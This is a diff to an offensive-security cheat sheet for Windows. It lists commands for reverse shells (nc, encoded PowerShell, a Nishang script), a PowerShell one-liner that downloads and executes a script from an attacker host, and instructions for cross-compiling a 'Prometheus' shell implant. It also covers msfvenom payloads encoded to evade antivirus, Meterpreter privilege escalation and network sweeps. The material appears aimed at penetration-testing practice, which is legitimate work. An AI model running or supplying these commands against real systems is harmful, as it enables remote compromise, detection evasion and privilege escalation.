@@ -13,9 +13,12 @@
         *   `\\[KALI_IP]\nc64.exe -e cmd.exe [KALI_IP] [PORT]`  → Input NC Shell Payload
         *   WebDAV                                                                                    → `webdavserv()` → Server At: `\\[KALI_IP]:8000\DavWWWRoot\`  
     *   Powershell
-        *   `powershell -c iex(New-Object System.Net.WebClient).DownloadString('http://[SERVER]/[PS1_FILE]');[FUNCTION_CALL]`
-        *   `powershell [-e / /enc] [B64_STRING]`                                         → [B64 Reverse Shell](https://www.revshells.com/)
+        *   `powershell -e [B64_STRING]`                                                           → [B64 Reverse Shell](https://www.revshells.com/)
         *   `echo '[CMD]' | iconv -f ascii -t utf-16le | base64 -w0`  → CMD to PS-B64 Conversion
+        *   Script / Shell Execution
+            *   [Invoke-PowershellTcp](https://raw.githubusercontent.com/samratashok/nishang/master/Shells/Invoke-PowerShellTcp.ps1)
+            *   `httpserv()`
+            *   `powershell -c iex(New-Object System.Net.WebClient).DownloadString('http://[KALI_IP]:8888/[SCRIPT]');[FUNCTION]`
         *   32/64-Bit Paths
             *   Try Both → `where powershell` / `set` → Infer Architecture
             *   `c:\windows\syswow64\windowspowershell\v1.0\powershell.exe`
@@ -108,6 +111,9 @@
             *   `msfvenom -x whoami.exe -p [WINDOWS_PAYLOAD] LHOST=[NIC] LPORT=4444 -f exe > out.exe`
             *   `msfvenom -p [WINDOWS_PAYLOAD] LHOST=[NIC] LPORT=4444 -e x86/shikata_ga_nai -b '\x00' -i 3 -f exe > out.exe`
             *   MalvDev / [Killer](https://github.com/0xHossam/Killer) / [Ebowla](https://0xdf.gitlab.io/2019/02/16/htb-giddy.html) / Shellter
+            *   Prometheus Shell
+                *   [Download](https://github.com/paranoidninja/0xdarkvortex-MalwareDevelopment/blob/master/prometheus.cpp) + Change IP & Port
+                *   32/64-Bit Cross-Compile → `[i686-w64-mingw32-g++ / g++] prometheus.cpp -o prometheus.exe -lws2_32 -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc`
     *   UAC
         *   Enumeration
             *   Member of "Administrators" + Restricted Privileges / Integrity Levels
@@ -185,8 +191,8 @@
             *   B64 to Kirbi      → `[IO.File]::WriteAllBytes("[KIRBI_TICKET]", [Convert]::FromBase64String("[BASE64_TICKET]"))`
             *   Kirbi to B64      → `[Convert]::ToBase64String([IO.File]::ReadAllBytes("[KIRBI_TICKET"]))`
     *   Enumeration
-        *   `net user`                       → `net user [USER]`
-        *   `net localgroup`           → `net localgroup [GROUP`
+        *   `net user`                       → `net user [USER]`  → Sensitive Exposure / Memberships / Logon Scripts        
+        *   `net localgroup`           → `net localgroup [GROUP]`
         *   `tree /a /f C:\users` → SSH / Sensitive Files / Vulnerable Applications & Data Folders
     *   RDP Hijacking (Local Admin)
         *   `query user` → Active RDP SESSIONNAME
@@ -386,9 +392,9 @@
             *   [Sherlock](https://github.com/rasta-mouse/Sherlock)                                                → Old Kernels → `Find-AllVulns`
             *   [MS14-068](https://swisskyrepo.github.io/InternalAllTheThings/active-directory/CVE/MS14-068/)                                              → Kerberos Local Escalation
             *   Meterpreter                                           → `use post/multi/recon/local_exploit_suggester` → `run`
-        *   Process Migration
-            *   Meterpreter Shell → `ps` → `svchost.exe` PID
-            *   `migrate [PID]`       → `load priv` → `getsystem`
+            *   Process Migration
+                *   Meterpreter Shell → `ps` → `svchost.exe` PID
+                *   `migrate [PID]`       → `load priv` → `getsystem`
         *   Elevated Install
             *   `reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated`
             *   `reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated`
@@ -423,7 +429,7 @@
             *   `10.x.x.x` / `192.168.x.x` / `172.[16-31].x.x`
             *   Local Ping Sweep
                 *   Valid for `/24` → Adjust Accordingly
-                *   `for /L %i in (1,1,255) do @ping -n 1 [INTRANET_CIDR_BLOCK].%i | find "Reply from" && echo [INTRANET_CIDR_BLOCK].%i is up`
+                *   `(for /L %a IN (1,1,254) DO ping /n 1 /w 1 [INTRANET_CIDR_BLOCK].%a) | find “Reply”`
         *   Traffic Sniffing
             *   `python net-creds.py -i [NIC]`
             *   TCPDump + PCAP Wireshark Analysis → All Unencrypted Protocols
